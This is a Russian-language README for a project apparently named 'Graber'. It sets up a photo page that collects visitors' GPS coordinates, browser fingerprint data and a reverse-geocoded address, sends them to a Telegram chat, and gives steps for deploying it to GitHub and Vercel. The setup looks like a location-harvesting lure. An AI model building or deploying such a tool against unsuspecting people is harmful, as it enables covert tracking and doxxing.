# Страница с фото и отправкой геолокации в Telegram

## Безопасность

- **Токен бота нельзя вставлять в HTML/JS** — его увидит любой посетитель.
- Если токен уже светился в чате или в коде — **создайте новый** в [@BotFather](https://t.me/BotFather) (Revoke / новый токен).

## Запуск (Windows, PowerShell)

```powershell
cd $HOME\Desktop\Graber
$env:TELEGRAM_BOT_TOKEN = "ВАШ_НОВЫЙ_ТОКЕН"
$env:TELEGRAM_CHAT_ID = "6248342909"
python server.py
```

Откройте в браузере: `http://127.0.0.1:8765/`

На телефоне в той же Wi‑Fi сети: `http://IP_ВАШЕГО_ПК:8765/` (точное GPS обычно работает лучше с телефона).

## Что собирается

- Координаты и метаданные GPS (после **системного** разрешения браузера).
- Данные окружения браузера (User-Agent, экран, язык, часовой пояс и т.д.).
- Примерный адрес через обратное геокодирование (Nominatim) на сервере.

Точность как у навигатора возможна только при разрешении геолокации и нормальном сигнале GPS/сети.

## GitHub

```powershell
cd $HOME\Desktop\Graber
git init
git add .
git commit -m "Initial commit"
```

Создайте пустой репозиторий на [github.com/new](https://github.com/new), затем:

```powershell
git remote add origin https://github.com/ВАШ_ЛОГИН/ИМЯ_РЕПО.git
git branch -M main
git push -u origin main
```

(Либо установите [GitHub CLI](https://cli.github.com/) и выполните `gh repo create ... --push`.)

## Vercel

Проект: статические `index.html`, `geolocation.html`, изображение и serverless **Python** `api/report.py` (тот же путь `POST /api/report`, что и у локального `server.py`).

1. Импортируйте репозиторий в [Vercel](https://vercel.com/new) **или** из каталога проекта: `npx vercel` (первый раз откроется браузер для входа).
2. В **Settings → Environment Variables** добавьте:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
3. Задеплойте (Production). После деплоя откройте выданный URL — кнопка на главной странице снова бьёт в `/api/report` на Vercel.

Локальный запуск по-прежнему через `python server.py` с теми же переменными в окружении.
